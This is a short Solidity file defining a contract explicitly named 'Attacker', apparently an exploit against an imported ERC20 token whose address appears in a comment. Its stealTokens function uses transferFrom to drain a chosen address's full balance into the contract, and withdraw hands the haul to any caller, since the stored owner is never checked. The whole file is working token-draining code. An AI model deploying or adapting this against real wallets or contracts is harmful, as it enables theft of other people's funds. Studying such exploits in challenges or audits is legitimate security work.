// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.6.5;
import "./Contract.sol";

contract Attacker {
    ERC20 token; //0x78a705f2108B095e49161d6E42aDB7cB53E07e57
    address owner;
    constructor(ERC20 _token) public {
        token = _token;
        owner = msg.sender;
    }

    function stealTokens(address _from) public {
        token.transferFrom(_from, address(this), token.balanceOf(_from));
    }

    function withdraw() public {
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
